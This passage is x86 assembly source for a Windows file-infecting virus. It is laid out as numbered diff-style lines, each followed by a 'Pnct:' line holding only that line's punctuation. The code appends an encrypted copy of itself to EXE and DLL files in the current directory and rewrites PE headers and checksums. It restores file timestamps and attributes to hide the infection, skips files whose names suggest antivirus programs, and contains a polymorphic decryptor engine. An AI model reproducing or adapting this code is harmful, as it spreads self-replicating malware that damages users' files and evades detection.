+01638: Pnct:                           ,     [ + ]           ;        
+01639:         mov     ecx,dword ptr [edx+3ch]         ; get aligment
+01640: Pnct:                           ,     [ + ]                   ;    
+01641:         xor     edx,edx
+01642: Pnct:                           ,
+01643:         div     ecx                             ; div vSize/aligment
+01644: Pnct:                                                                                     ;     /
+01645:         inc     eax                             ; plus one
+01646: Pnct:                                                                                     ;    
+01647:         xor     edx,edx
+01648: Pnct:                           ,
+01649:         mul     ecx                             ; mul by aligment
+01650: Pnct:                                                                                     ;      
+01651:         pop     edx
+01652: Pnct:                          
+01653:         mov     dword ptr [sPhysSize+ebp],eax   ; store the phys size
+01654: Pnct:                               [ + ] ,       ;        
+01655:         push    edx
+01656: Pnct:                        
+01657:         mov     ecx,PADDING                     ; calc our padding
+01658: Pnct:                           ,                                           ;      
+01659:         add     eax,dword ptr [fileSize+ebp]
+01660: Pnct:                           ,     [ + ]
+01661:         xor     edx,edx
+01662: Pnct:                           ,
+01663:         div     ecx
+01664: Pnct:                          
+01665:         inc     eax
+01666: Pnct:                          
+01667:         xor     edx,edx
+01668: Pnct:                           ,
+01669:         mul     ecx
+01670: Pnct:                          
+01671:         mov     dword ptr [pad+ebp],eax
+01672: Pnct:                               [ + ] ,
+01673:         pop     edx
+01674: Pnct:                          
+01675:                                                 ; calc fix for the img size
+01676: Pnct:                                                                                                 ;            
+01677:         mov     eax,dword ptr [sVirtSize+ebp]   ; get our virt size
+01678: Pnct:                           ,     [ + ]       ;        
+01679:         mov     ecx,dword ptr [edx+38h]         ; get obj aligment
+01680: Pnct:                           ,     [ + ]                   ;      
+01681:         push    edx
+01682: Pnct:                        
+01683:         xor     edx,edx
+01684: Pnct:                           ,
+01685:         div     ecx                             ; div virt size/aligment
+01686: Pnct:                                                                                     ;       /
+01687:         inc     eax                             ; plus one
+01688: Pnct:                                                                                     ;    
+01689:         xor     edx,edx
+01690: Pnct:                           ,
+01691:         mul     ecx                             ; mul by aligment
+01692: Pnct:                                                                                     ;      
+01693:         pop     edx
+01694: Pnct:                          
+01695:         add     dword ptr [edx+50h],eax         ; fix the image size
+01696: Pnct:                               [ + ] ,                   ;        
+01697:         mov     ecx,28h                         ; copy our new section
+01698: Pnct:                           ,                                                   ;        
+01699:         lea     esi,sect+ebp
+01700: Pnct:                           , +
+01701:         rep     movsb
+01702: Pnct:                          
+01703:         mov     byte ptr [lendeFlag+ebp],0ffh   ; activate LENDE
+01704: Pnct:                               [ + ] ,       ;    
+01705:         mov     ecx,vSize                       ; make a clean copy
+01706: Pnct:                           ,                                               ;        
+01707:         lea     edi,tmpVirus+ebp                ; of the virus
+01708: Pnct:                           , +                                 ;      
+01709:         lea     esi,vBegin+ebp
+01710: Pnct:                           , +
+01711:         rep     movsb
+01712: Pnct:                          
+01713:         xor     eax,eax
+01714: Pnct:                           ,
+01715:         inc     eax
+01716: Pnct:                          
+01717:         call    CLENDE2                         ; encrypt 3rd zone
+01718: Pnct:                                                                           ;      
+01719:         call    CLENDE0                         ; encrypt 1st zone
+01720: Pnct:                                                                           ;      
+01721:         call    CLENDE1                         ; encrypt 2nd zone
+01722: Pnct:                                                                           ;      
+01723:                                                 ; encrypt 2nd layer 1st
+01724: Pnct:                                                                                                 ;        
+01725:         mov     ecx,offset cryptEnd-offset scndLayer
+01726: Pnct:                           ,   -  
+01727:         lea     esi,tmpVirus+ebp
+01728: Pnct:                           , +
+01729:         add     esi,offset scndLayer-offset inicio
+01730: Pnct:                           ,   -  
+01731:         mov     al,byte ptr [scndKey+ebp]
+01732: Pnct:                           ,     [ + ]
+01733: cryptLoop0:
+01734: Pnct: :
+01735:         xor     byte ptr [esi],al
+01736: Pnct:                               [ ] ,
+01737:         inc     esi
+01738: Pnct:                          
+01739:         loop    cryptLoop0
+01740: Pnct:                        
+01741:         mov     ebx,dword ptr [LoKey+ebp]
+01742: Pnct:                           ,     [ + ]
+01743:         mov     eax,dword ptr [HiKey+ebp]
+01744: Pnct:                           ,     [ + ]
+01745:         lea     esi,tmpVirus+ebp                ; encrypt 1st layer
+01746: Pnct:                           , +                                 ;      
+01747:         add     esi,offset cryptIni-offset inicio
+01748: Pnct:                           ,   -  
+01749:         mov     ecx,cSize/8
+01750: Pnct:                           , /
+01751: cryptLoop:
+01752: Pnct: :
+01753:         xor     dword ptr [esi],ebx
+01754: Pnct:                               [ ] ,
+01755:         add     esi,4
+01756: Pnct:                           ,
+01757:         add     ebx,01020304h
+01758: Pnct:                           ,
+01759:         xor     dword ptr [esi],eax
+01760: Pnct:                               [ ] ,
+01761:         add     esi,4
+01762: Pnct:                           ,
+01763:         sub     eax,01020304h
+01764: Pnct:                           ,
+01765:         loop    cryptLoop
+01766: Pnct:                        
+01767:         push    dword ptr [mapMem+ebp]
+01768: Pnct:                             [ + ]
+01769:         call    dword ptr [_UnmapViewOfFile+ebp] ; delete map view
+01770: Pnct:                             [ _ + ]   ;      
+01771:         push    dword ptr [fhmap+ebp]           ; close the mapped file
+01772: Pnct:                             [ + ]                       ;        
+01773:         call    dword ptr [_CloseHandle+ebp]
+01774: Pnct:                             [ _ + ]
+01775:         xor     eax,eax
+01776: Pnct:                           ,
+01777:         push    eax
+01778: Pnct:                        
+01779:         push    dword ptr [pad+ebp]
+01780: Pnct:                             [ + ]
+01781:         push    eax
+01782: Pnct:                        
+01783:         push    00000004h
+01784: Pnct:                        
+01785:         push    eax
+01786: Pnct:                        
+01787:         push    dword ptr [fHnd+ebp]
+01788: Pnct:                             [ + ]
+01789:         call    dword ptr [_CreateFileMappingA+ebp]
+01790: Pnct:                             [ _ + ]
+01791:         or      eax,eax                         ; create a mapping file
+01792: Pnct:                             ,                                                   ;        
+01793:         jz      infectionErrorClose             ; for read/write adding our
+01794: Pnct:                                                       ;     /    
+01795:                                                 ; virus+padding
+01796: Pnct:                                                                                                 ;   +
+01797:         mov     dword ptr [fhmap+ebp],eax       ; save
+01798: Pnct:                               [ + ] ,               ;  
+01799:         xor     eax,eax
+01800: Pnct:                           ,
+01801:         push    dword ptr [pad+ebp]
+01802: Pnct:                             [ + ]
+01803:         push    eax
+01804: Pnct:                        
+01805:         push    eax
+01806: Pnct:                        
+01807:         push    00000004h OR 00000002h
+01808: Pnct:                            
+01809:         push    dword ptr [fhmap+ebp]
+01810: Pnct:                             [ + ]
+01811:         call    dword ptr [_MapViewOfFile+ebp]  ; and remap
+01812: Pnct:                             [ _ + ]     ;    
+01813:         or      eax,eax
+01814: Pnct:                             ,
+01815:         jz      infectionErrorCloseMap
+01816: Pnct:                            
+01817:         mov     dword ptr [mapMem+ebp],eax      ; save
+01818: Pnct:                               [ + ] ,             ;  
+01819:         mov     ecx,dword ptr [gensize+ebp]
+01820: Pnct:                           ,     [ + ]
+01821:         lea     esi,tmpVirus+ebp
+01822: Pnct:                           , +
+01823:         mov     edi,eax
+01824: Pnct:                           ,
+01825:         add     edi,dword ptr [fileSize+ebp]
+01826: Pnct:                           ,     [ + ]
+01827:         rep     movsb                           ; copy our babe to file
+01828: Pnct:                                                                                 ;          
+01829:         xchg    ecx,eax                         ; bah... is not needed
+01830: Pnct:                         ,                                                   ;   . . .      
+01831:         mov     eax,edi                         ; but i want ALL the padding
+01832: Pnct:                           ,                                                   ;            
+01833:         sub     eax,ecx                         ; to be zero
+01834: Pnct:                           ,                                                   ;      
+01835:         mov     ecx,dword ptr [pad+ebp]
+01836: Pnct:                           ,     [ + ]
+01837:         sub     ecx,eax
+01838: Pnct:                           ,
+01839:         xor     eax,eax
+01840: Pnct:                           ,
+01841:         rep     stosb
+01842: Pnct:                          
+01843:         mov     ecx,dword ptr [pad+ebp]         ; calc the new check sum
+01844: Pnct:                           ,     [ + ]                   ;          
+01845:         inc     ecx
+01846: Pnct:                          
+01847:         shr     ecx,1
+01848: Pnct:                           ,
+01849:         mov     esi,dword ptr [mapMem+ebp]
+01850: Pnct:                           ,     [ + ]
+01851:         call    CheckSumMappedFile              ; calc partial check sum
+01852: Pnct:                                                     ;        
+01853:         add     esi,dword ptr [esi+3ch]         ; goto begin of nt header
+01854: Pnct:                           ,     [ + ]                   ;          
+01855:         mov     word ptr [pchcks+ebp],ax
+01856: Pnct:                               [ + ] ,
+01857:         mov     edx,1                           ; complete the check sum
+01858: Pnct:                           ,                                                       ;        
+01859:         mov     ecx,edx
+01860: Pnct:                           ,
+01861:         mov     ax,word ptr [esi+58h]
+01862: Pnct:                           ,     [ + ]
+01863:         cmp     word ptr [pchcks+ebp],ax
+01864: Pnct:                               [ + ] ,
+01865:         adc     ecx,-1
+01866: Pnct:                           , -
+01867:         sub     word ptr [pchcks+ebp],cx
+01868: Pnct:                               [ + ] ,
+01869:         sub     word ptr [pchcks+ebp],ax
+01870: Pnct:                               [ + ] ,
+01871:         mov     ax,word ptr [esi+5ah]
+01872: Pnct:                           ,     [ + ]
+01873:         cmp     word ptr [pchcks+ebp],ax
+01874: Pnct:                               [ + ] ,
+01875:         adc     edx,-1
+01876: Pnct:                           , -
+01877:         sub     word ptr [pchcks+ebp],dx
+01878: Pnct:                               [ + ] ,
+01879:         sub     word ptr [pchcks+ebp],ax
+01880: Pnct:                               [ + ] ,
+01881:         movzx   ecx,word ptr [pchcks+ebp]
+01882: Pnct:                       ,     [ + ]
+01883:         add     ecx,dword ptr [pad+ebp]
+01884: Pnct:                           ,     [ + ]
+01885:         mov     dword ptr [esi+58h],ecx         ; set new check sum
+01886: Pnct:                               [ + ] ,                   ;        
+01887: infectionErrorCloseUnmap:
+01888: Pnct: :
+01889:         push    dword ptr [mapMem+ebp]
+01890: Pnct:                             [ + ]
+01891:         call    dword ptr [_UnmapViewOfFile+ebp] ; delete map view
+01892: Pnct:                             [ _ + ]   ;      
+01893: infectionErrorCloseMap:
+01894: Pnct: :
+01895:         push    dword ptr [fhmap+ebp]           ; close the mapped file
+01896: Pnct:                             [ + ]                       ;        
+01897:         call    dword ptr [_CloseHandle+ebp]
+01898: Pnct:                             [ _ + ]
+01899:         lea     edi,fileTime2+ebp
+01900: Pnct:                           , +
+01901:         push    edi
+01902: Pnct:                        
+01903:         lea     edi,fileTime1+ebp
+01904: Pnct:                           , +
+01905:         push    edi
+01906: Pnct:                        
+01907:         lea     edi,fileTime0+ebp
+01908: Pnct:                           , +
+01909:         push    edi
+01910: Pnct:                        
+01911:         push    dword ptr [fHnd+ebp]
+01912: Pnct:                             [ + ]
+01913:         call    dword ptr [_SetFileTime+ebp]    ; restore file time
+01914: Pnct:                             [ _ + ]         ;      
+01915: infectionErrorClose:
+01916: Pnct: :
+01917:         push    dword ptr [fHnd+ebp]            ; close the file
+01918: Pnct:                             [ + ]                         ;      
+01919:         call    dword ptr [_CloseHandle+ebp]
+01920: Pnct:                             [ _ + ]
+01921: infectionErrorAttrib:
+01922: Pnct: :
+01923:         push    dword ptr [fileAttrib+ebp]
+01924: Pnct:                             [ + ]
+01925:         push    dword ptr [fNameAddr+ebp]       ; restore attributes
+01926: Pnct:                             [ + ]               ;    
+01927:         call    dword ptr [_SetFileAttributesA+ebp]
+01928: Pnct:                             [ _ + ]
+01929: infectionError:
+01930: Pnct: :
+01931:         xor     esi,esi                         ; quit SEH
+01932: Pnct:                           ,                                                   ;    
+01933:         pop     dword ptr fs:[esi]
+01934: Pnct:                               : [ ]
+01935:         pop     eax
+01936: Pnct:                          
+01937:         popad                                   ; restore all
+01938: Pnct:                                                                                       ;    
+01939:         ret
+01940: Pnct:                
+01941: infException:                                   ; oh
+01942: Pnct: :                                                                       ;  
+01943:         xor     esi,esi
+01944: Pnct:                           ,
+01945:         mov     eax,dword ptr fs:[esi]
+01946: Pnct:                           ,     : [ ]
+01947:         mov     esp,dword ptr [eax]
+01948: Pnct:                           ,     [ ]
+01949:         call    deltaExceptInf
+01950: Pnct:                        
+01951: deltaExceptInf:                                 ; get delta another time
+01952: Pnct: :                                                                   ;        
+01953:         pop     ebp
+01954: Pnct:                          
+01955:         sub     ebp,offset deltaExceptInf
+01956: Pnct:                           ,  
+01957:         jmp     infectionError
+01958: Pnct:                          
+01959: ;
+01960: Pnct: ;
+01961: ; Infects all the files in the current directory
+01962: Pnct: ;                
+01963: ;   al=0 dll
+01964: Pnct: ;       =  
+01965: ;   al=1 exe
+01966: Pnct: ;       =  
+01967: ;
+01968: Pnct: ;
+01969: infectDir:
+01970: Pnct: :
+01971:         lea     esi,find_data+ebp               ; push find struct
+01972: Pnct:                           , _ +                               ;      
+01973:         push    esi
+01974: Pnct:                        
+01975:         or      al,al                           ; select between exe or dll
+01976: Pnct:                             ,                                                       ;          
+01977:         jz      findDll
+01978: Pnct:                            
+01979:         lea     esi,exeMask+ebp
+01980: Pnct:                           , +
+01981:         jmp     findFst
+01982: Pnct:                          
+01983: findDll:
+01984: Pnct: :
+01985:         lea     esi,dllMask+ebp
+01986: Pnct:                           , +
+01987: findFst:
+01988: Pnct: :
+01989:         push    esi
+01990: Pnct:                        
+01991:         call    dword ptr [_FindFirstFileA+ebp] ; Find first file
+01992: Pnct:                             [ _ + ]   ;      
+01993:         inc     eax
+01994: Pnct:                          
+01995:         jz      notFound
+01996: Pnct:                            
+01997:         dec     eax
+01998: Pnct:                          
+01999:         mov     dword ptr [findHnd+ebp],eax
+02000: Pnct:                               [ + ] ,
+02001: findNext:
+02002: Pnct: :
+02003:         mov     eax,dword ptr [find_data.nFileSizeHigh+ebp]
+02004: Pnct:                           ,     [ _ . + ]
+02005:         or      eax,eax
+02006: Pnct:                             ,
+02007:         jnz     skipThisFile                    ; too much file for me! haha
+02008: Pnct:                                                                   ;           !  
+02009:         mov     eax,dword ptr [find_data.nFileSizeLow+ebp]
+02010: Pnct:                           ,     [ _ . + ]
+02011:         mov     ecx,PADDING                     ; test if it's infected
+02012: Pnct:                           ,                                           ;       '  
+02013:         xor     edx,edx                         ; yet
+02014: Pnct:                           ,                                                   ;  
+02015:         div     ecx
+02016: Pnct:                          
+02017:         or      edx,edx                         ; reminder is zero?
+02018: Pnct:                             ,                                                   ;       ?
+02019:         jz      skipThisFile
+02020: Pnct:                            
+02021: testIfAv:                                       ; let's search for strings
+02022: Pnct: :                                                                               ;   '      
+02023:                                                 ; that may appear in av progs
+02024: Pnct:                                                                                                 ;            
+02025:         lea     esi,find_data.cFileName+ebp
+02026: Pnct:                           , _ . +
+02027:         lea     edi,avStrings+ebp
+02028: Pnct:                           , +
+02029:         mov     ecx,vStringsCout
+02030: Pnct:                           ,
+02031: testIfAvL:
+02032: Pnct: :
+02033:         push    ecx
+02034: Pnct:                        
+02035:         mov     ax,word ptr [edi]
+02036: Pnct:                           ,     [ ]
+02037:         call    filter
+02038: Pnct:                        
+02039:         pop     ecx
+02040: Pnct:                          
+02041:         jc      skipThisFile
+02042: Pnct:                            
+02043:         add     edi,2
+02044: Pnct:                           ,
+02045:         loop    testIfAvL
+02046: Pnct:                        
+02047:         lea     esi,find_data.cFileName+ebp
+02048: Pnct:                           , _ . +
+02049:         call    infection
+02050: Pnct:                        
+02051: skipThisFile:
+02052: Pnct: :
+02053:         lea     esi,find_data+ebp
+02054: Pnct:                           , _ +
+02055:         push    esi
+02056: Pnct:                        
+02057:         push    dword ptr [findHnd+ebp]
+02058: Pnct:                             [ + ]
+02059:         call    dword ptr [_FindNextFileA+ebp]  ; Find next file
+02060: Pnct:                             [ _ + ]     ;      
+02061:         or      eax,eax
+02062: Pnct:                             ,
+02063:         jnz     findNext
+02064: Pnct:                          
+02065:         push    dword ptr [findHnd+ebp]
+02066: Pnct:                             [ + ]
+02067:         call    dword ptr [_CloseHandle+ebp]    ; close find handle
+02068: Pnct:                             [ _ + ]         ;      
+02069: notFound:
+02070: Pnct: :
+02071:         ret
+02072: Pnct:                
+02073: ;
+02074: Pnct: ;
+02075: ;  This is our func that does the partial check sum of the file.
+02076: Pnct: ;                             .
+02077: ;
+02078: Pnct: ;
+02079: ;   in: ecx (fileSize+1) shr 2
+02080: Pnct: ;       :     ( + )    
+02081: ;       esi offset mappedFile
+02082: Pnct: ;                  
+02083: ;
+02084: Pnct: ;
+02085: ;  out: eax partial checksum of file
+02086: Pnct: ;     :          
+02087: ;
+02088: Pnct: ;
+02089: CheckSumMappedFile:
+02090: Pnct: :
+02091:         push    esi
+02092: Pnct:                        
+02093:         xor     eax, eax
+02094: Pnct:                           ,  
+02095:         shl     ecx, 1
+02096: Pnct:                           ,  
+02097:         je      func0_saltito0
+02098: Pnct:                             _
+02099:         test    esi, 00000002h
+02100: Pnct:                         ,  
+02101:         je      func0_saltito1
+02102: Pnct:                             _
+02103:         sub     edx, edx
+02104: Pnct:                           ,  
+02105:         mov     dx, word ptr [esi]
+02106: Pnct:                           ,       [ ]
+02107:         add     eax, edx
+02108: Pnct:                           ,  
+02109:         adc     eax, 00000000h
+02110: Pnct:                           ,  
+02111:         add     esi, 00000002h
+02112: Pnct:                           ,  
+02113:         sub     ecx, 00000002h
+02114: Pnct:                           ,  
+02115: func0_saltito1:
+02116: Pnct: _ :
+02117:         mov     edx, ecx
+02118: Pnct:                           ,  
+02119:         and     edx, 00000007h
+02120: Pnct:                           ,  
+02121:         sub     ecx, edx
+02122: Pnct:                           ,  
+02123:         je      func0_saltito2
+02124: Pnct:                             _
+02125:         test    ecx, 00000008h
+02126: Pnct:                         ,  
+02127:         je      func0_saltito3
+02128: Pnct:                             _
+02129:         add     eax, dword ptr [esi]
+02130: Pnct:                           ,       [ ]
+02131:         adc     eax, dword ptr [esi+04h]
+02132: Pnct:                           ,       [ + ]
+02133:         adc     eax, 00000000h
+02134: Pnct:                           ,  
+02135:         add     esi, 00000008h
+02136: Pnct:                           ,  
+02137:         sub     ecx, 00000008h
+02138: Pnct:                           ,  
+02139:         je      func0_saltito2
+02140: Pnct:                             _
+02141: func0_saltito3:
+02142: Pnct: _ :
+02143:         test    ecx, 00000010h
+02144: Pnct:                         ,  
+02145:         je      func0_saltito4
+02146: Pnct:                             _
+02147:         add     eax, dword ptr [esi]
+02148: Pnct:                           ,       [ ]
+02149:         adc     eax, dword ptr [esi+04h]
+02150: Pnct:                           ,       [ + ]
+02151:         adc     eax, dword ptr [esi+08h]
+02152: Pnct:                           ,       [ + ]
+02153:         adc     eax, dword ptr [esi+0Ch]
+02154: Pnct:                           ,       [ + ]
+02155:         adc     eax, 00000000h
+02156: Pnct:                           ,  
+02157:         add     esi, 00000010h
+02158: Pnct:                           ,  
+02159:         sub     ecx, 00000010h
+02160: Pnct:                           ,  
+02161:         je      func0_saltito2
+02162: Pnct:                             _
+02163: func0_saltito4:
+02164: Pnct: _ :
+02165:         test    ecx, 00000020h
+02166: Pnct:                         ,  
+02167:         je      func0_saltito5
+02168: Pnct:                             _
+02169:         add     eax, dword ptr [esi]
+02170: Pnct:                           ,       [ ]
+02171:         adc     eax, dword ptr [esi+04h]
+02172: Pnct:                           ,       [ + ]
+02173:         adc     eax, dword ptr [esi+08h]
+02174: Pnct:                           ,       [ + ]
+02175:         adc     eax, dword ptr [esi+0Ch]
+02176: Pnct:                           ,       [ + ]
+02177:         adc     eax, dword ptr [esi+10h]
+02178: Pnct:                           ,       [ + ]
+02179:         adc     eax, dword ptr [esi+14h]
+02180: Pnct:                           ,       [ + ]
+02181:         adc     eax, dword ptr [esi+18h]
+02182: Pnct:                           ,       [ + ]
+02183:         adc     eax, dword ptr [esi+1Ch]
+02184: Pnct:                           ,       [ + ]
+02185:         adc     eax, 00000000h
+02186: Pnct:                           ,  
+02187:         add     esi, 00000020h
+02188: Pnct:                           ,  
+02189:         sub     ecx, 00000020h
+02190: Pnct:                           ,  
+02191:         je      func0_saltito2
+02192: Pnct:                             _
+02193: func0_saltito5:
+02194: Pnct: _ :
+02195:         test    ecx, 00000040h
+02196: Pnct:                         ,  
+02197:         je      func0_saltito6
+02198: Pnct:                             _
+02199:         add     eax, dword ptr [esi]
+02200: Pnct:                           ,       [ ]
+02201:         adc     eax, dword ptr [esi+04h]
+02202: Pnct:                           ,       [ + ]
+02203:         adc     eax, dword ptr [esi+08h]
+02204: Pnct:                           ,       [ + ]
+02205:         adc     eax, dword ptr [esi+0Ch]
+02206: Pnct:                           ,       [ + ]
+02207:         adc     eax, dword ptr [esi+10h]
+02208: Pnct:                           ,       [ + ]
+02209:         adc     eax, dword ptr [esi+14h]
+02210: Pnct:                           ,       [ + ]
+02211:         adc     eax, dword ptr [esi+18h]
+02212: Pnct:                           ,       [ + ]
+02213:         adc     eax, dword ptr [esi+1Ch]
+02214: Pnct:                           ,       [ + ]
+02215:         adc     eax, dword ptr [esi+20h]
+02216: Pnct:                           ,       [ + ]
+02217:         adc     eax, dword ptr [esi+24h]
+02218: Pnct:                           ,       [ + ]
+02219:         adc     eax, dword ptr [esi+28h]
+02220: Pnct:                           ,       [ + ]
+02221:         adc     eax, dword ptr [esi+2Ch]
+02222: Pnct:                           ,       [ + ]
+02223:         adc     eax, dword ptr [esi+30h]
+02224: Pnct:                           ,       [ + ]
+02225:         adc     eax, dword ptr [esi+34h]
+02226: Pnct:                           ,       [ + ]
+02227:         adc     eax, dword ptr [esi+38h]
+02228: Pnct:                           ,       [ + ]
+02229:         adc     eax, dword ptr [esi+3Ch]
+02230: Pnct:                           ,       [ + ]
+02231:         adc     eax, 00000000h
+02232: Pnct:                           ,  
+02233:         add     esi, 00000040h
+02234: Pnct:                           ,  
+02235:         sub     ecx, 00000040h
+02236: Pnct:                           ,  
+02237:         je      func0_saltito2
+02238: Pnct:                             _
+02239: func0_saltito6:
+02240: Pnct: _ :
+02241:         add     eax, dword ptr [esi]
+02242: Pnct:                           ,       [ ]
+02243:         adc     eax, dword ptr [esi+04h]
+02244: Pnct:                           ,       [ + ]
+02245:         adc     eax, dword ptr [esi+08h]
+02246: Pnct:                           ,       [ + ]
+02247:         adc     eax, dword ptr [esi+0Ch]
+02248: Pnct:                           ,       [ + ]
+02249:         adc     eax, dword ptr [esi+10h]
+02250: Pnct:                           ,       [ + ]
+02251:         adc     eax, dword ptr [esi+14h]
+02252: Pnct:                           ,       [ + ]
+02253:         adc     eax, dword ptr [esi+18h]
+02254: Pnct:                           ,       [ + ]
+02255:         adc     eax, dword ptr [esi+1Ch]
+02256: Pnct:                           ,       [ + ]
+02257:         adc     eax, dword ptr [esi+20h]
+02258: Pnct:                           ,       [ + ]
+02259:         adc     eax, dword ptr [esi+24h]
+02260: Pnct:                           ,       [ + ]
+02261:         adc     eax, dword ptr [esi+28h]
+02262: Pnct:                           ,       [ + ]
+02263:         adc     eax, dword ptr [esi+2Ch]
+02264: Pnct:                           ,       [ + ]
+02265:         adc     eax, dword ptr [esi+30h]
+02266: Pnct:                           ,       [ + ]
+02267:         adc     eax, dword ptr [esi+34h]
+02268: Pnct:                           ,       [ + ]
+02269:         adc     eax, dword ptr [esi+38h]
+02270: Pnct:                           ,       [ + ]
+02271:         adc     eax, dword ptr [esi+3Ch]
+02272: Pnct:                           ,       [ + ]
+02273:         adc     eax, dword ptr [esi+40h]
+02274: Pnct:                           ,       [ + ]
+02275:         adc     eax, dword ptr [esi+44h]
+02276: Pnct:                           ,       [ + ]
+02277:         adc     eax, dword ptr [esi+48h]
+02278: Pnct:                           ,       [ + ]
+02279:         adc     eax, dword ptr [esi+4Ch]
+02280: Pnct:                           ,       [ + ]
+02281:         adc     eax, dword ptr [esi+50h]
+02282: Pnct:                           ,       [ + ]
+02283:         adc     eax, dword ptr [esi+54h]
+02284: Pnct:                           ,       [ + ]
+02285:         adc     eax, dword ptr [esi+58h]
+02286: Pnct:                           ,       [ + ]
+02287:         adc     eax, dword ptr [esi+5Ch]
+02288: Pnct:                           ,       [ + ]
+02289:         adc     eax, dword ptr [esi+60h]
+02290: Pnct:                           ,       [ + ]
+02291:         adc     eax, dword ptr [esi+64h]
+02292: Pnct:                           ,       [ + ]
+02293:         adc     eax, dword ptr [esi+68h]
+02294: Pnct:                           ,       [ + ]
+02295:         adc     eax, dword ptr [esi+6Ch]
+02296: Pnct:                           ,       [ + ]
+02297:         adc     eax, dword ptr [esi+70h]
+02298: Pnct:                           ,       [ + ]
+02299:         adc     eax, dword ptr [esi+74h]
+02300: Pnct:                           ,       [ + ]
+02301:         adc     eax, dword ptr [esi+78h]
+02302: Pnct:                           ,       [ + ]
+02303:         adc     eax, dword ptr [esi+7Ch]
+02304: Pnct:                           ,       [ + ]
+02305:         adc     eax, 00000000h
+02306: Pnct:                           ,  
+02307:         add     esi, 00000080h
+02308: Pnct:                           ,  
+02309:         sub     ecx, 00000080h
+02310: Pnct:                           ,  
+02311:         jne     func0_saltito6
+02312: Pnct:                           _
+02313: func0_saltito2:
+02314: Pnct: _ :
+02315:         test    edx, edx
+02316: Pnct:                         ,  
+02317:         je      func0_saltito0
+02318: Pnct:                             _
+02319: func0_saltito7:
+02320: Pnct: _ :
+02321:         sub     ecx, ecx
+02322: Pnct:                           ,  
+02323:         mov     cx, word ptr [esi]
+02324: Pnct:                           ,       [ ]
+02325:         add     eax, ecx
+02326: Pnct:                           ,  
+02327:         adc     eax, 00000000h
+02328: Pnct:                           ,  
+02329:         add     esi, 00000002h
+02330: Pnct:                           ,  
+02331:         sub     edx, 00000002h
+02332: Pnct:                           ,  
+02333:         jne     func0_saltito7
+02334: Pnct:                           _
+02335: func0_saltito0:
+02336: Pnct: _ :
+02337:         mov     edx, eax
+02338: Pnct:                           ,  
+02339:         shr     edx, 10h
+02340: Pnct:                           ,  
+02341:         and     eax, 0000FFFFh
+02342: Pnct:                           ,  
+02343:         add     eax, edx
+02344: Pnct:                           ,  
+02345:         mov     edx, eax
+02346: Pnct:                           ,  
+02347:         shr     edx, 10h
+02348: Pnct:                           ,  
+02349:         add     eax, edx
+02350: Pnct:                           ,  
+02351:         and     eax, 0000FFFFh
+02352: Pnct:                           ,  
+02353:         pop     esi
+02354: Pnct:                          
+02355:         ret
+02356: Pnct:                
+02357: ;
+02358: Pnct: ;
+02359: ; [AOCPE] - 'Anvil Of Crom Polymorphic Engine'
+02360: Pnct: ;   [ ]   -   '         '
+02361: ;
+02362: Pnct: ;
+02363: ;  EAX: HiKey
+02364: Pnct: ;     :  
+02365: ;  EBX: LoKey
+02366: Pnct: ;     :  
+02367: ;  ECX: CodeSize
+02368: Pnct: ;     :  
+02369: ;  EDI: Destination address
+02370: Pnct: ;     :    
+02371: ;
+02372: Pnct: ;
+02373: ; returns EAX: size of generated proc
+02374: Pnct: ;     :        
+02375: ;
+02376: Pnct: ;
+02377: _EAX    equ     0
+02378: Pnct: _                  
+02379: _ECX    equ     1
+02380: Pnct: _                  
+02381: _EDX    equ     2
+02382: Pnct: _                  
+02383: _EBX    equ     3
+02384: Pnct: _                  
+02385: _ESP    equ     4
+02386: Pnct: _                  
+02387: _EBP    equ     5
+02388: Pnct: _                  
+02389: _ESI    equ     6
+02390: Pnct: _                  
+02391: _EDI    equ     7
+02392: Pnct: _                  
+02393: AOCPE:
+02394: Pnct: :
+02395:         push    edi                             ; save for later use
+02396: Pnct:                                                                                   ;        
+02397:         mov     dword ptr [RegStatus+ebp],0     ; set this to zero
+02398: Pnct:                               [ + ] ,           ;        
+02399:         mov     dword ptr [RegStatus+ebp+4],0   ; set this to zero
+02400: Pnct:                               [ + + ] ,       ;        
+02401:         mov     byte ptr [RegStatus+ebp+_EBP],1 ; EBP non free!
+02402: Pnct:                               [ + + _ ] ,   ;       !
+02403:         mov     byte ptr [RegStatus+ebp+_ESP],1 ; ESP non free!
+02404: Pnct:                               [ + + _ ] ,   ;       !
+02405:         mov     dword ptr [HiKey+ebp],eax       ; save the keys
+02406: Pnct:                               [ + ] ,               ;      
+02407:         mov     dword ptr [LoKey+ebp],ebx
+02408: Pnct:                               [ + ] ,
+02409:         xor     edx,edx
+02410: Pnct:                           ,
+02411:         xchg    eax,ecx
+02412: Pnct:                         ,
+02413:         mov     ecx,08h
+02414: Pnct:                           ,
+02415:         div     cx
+02416: Pnct:                          
+02417:         mov     dword ptr [CodeSize+ebp],eax    ; and the code size
+02418: Pnct:                               [ + ] ,         ;        
+02419:         call    GetReg                          ; select random key regs
+02420: Pnct:                                                                             ;        
+02421:         mov     byte ptr [LoKeyReg+ebp],al
+02422: Pnct:                               [ + ] ,
+02423:         call    GetReg                          ; select random key regs
+02424: Pnct:                                                                             ;        
+02425:         mov     byte ptr [HiKeyReg+ebp],al
+02426: Pnct:                               [ + ] ,
+02427:         call    AddShit
+02428: Pnct:                        
+02429:         mov     cl,_EBP                         ; push ebp
+02430: Pnct:                           , _                                                   ;    
+02431:         call    AddPushREG
+02432: Pnct:                        
+02433:         call    AddShit
+02434: Pnct:                        
+02435:         mov     ax,0ec8bh                       ; mov ebp,esp
+02436: Pnct:                           ,                                               ;     ,
+02437:         stosw
+02438: Pnct:                
+02439:         call    AddShit
+02440: Pnct:                        
+02441:         mov     edx,04h
+02442: Pnct:                           ,
+02443:         mov     cl,_EBP
+02444: Pnct:                           , _
+02445:         call    AddMovREGMEMEBP                 ; get call address
+02446: Pnct:                                                           ;      
+02447:         ; now we have the address of code to decrypt into EBP
+02448: Pnct:                 ;                      
+02449:         mov     cl,byte ptr [LoKeyReg+ebp]      ; push LoKeyReg
+02450: Pnct:                           ,     [ + ]             ;    
+02451:         call    AddPushREG
+02452: Pnct:                        
+02453:         call    AddShit
+02454: Pnct:                        
+02455:         mov     cl,byte ptr [HiKeyReg+ebp]      ; push HiKeyReg
+02456: Pnct:                           ,     [ + ]             ;    
+02457:         call    AddPushREG
+02458: Pnct:                        
+02459:         call    dword ptr [_GetTickCount+ebp]
+02460: Pnct:                             [ _ + ]
+02461:         and     eax,15
+02462: Pnct:                           ,
+02463:         mov     ecx,eax
+02464: Pnct:                           ,
+02465:         mov     ebx,ecx
+02466: Pnct:                           ,
+02467:         xor     eax,edi
+02468: Pnct:                           ,
+02469: AOCPELOOP0:
+02470: Pnct: :
